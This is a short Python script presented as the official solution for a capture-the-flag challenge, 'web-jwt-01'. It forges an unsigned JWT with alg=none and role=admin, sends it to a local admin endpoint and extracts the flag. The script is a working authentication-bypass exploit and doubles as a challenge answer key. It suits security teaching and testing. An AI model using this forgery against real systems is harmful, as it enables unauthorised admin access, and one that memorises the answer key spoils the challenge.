"""
Official solution for web-jwt-01.

The JWT verifier accepts alg=none, skipping signature verification.
We craft a token with alg=none in the header and role=admin in the payload.
The signature part is left empty.

Token structure: base64url(header).base64url(payload).
"""
import base64, json, requests, re

def b64url(data: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

header = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"sub": "guest", "role": "admin"})
token = f"{header}.{payload}."  # empty signature

print(f"Forged token: {token}")

r = requests.get(f"http://localhost:5000/admin?token={token}")
flag = re.search(r"CTF\{[^}]+\}", r.text)
print(f"Flag: {flag.group()}" if flag else "Failed")
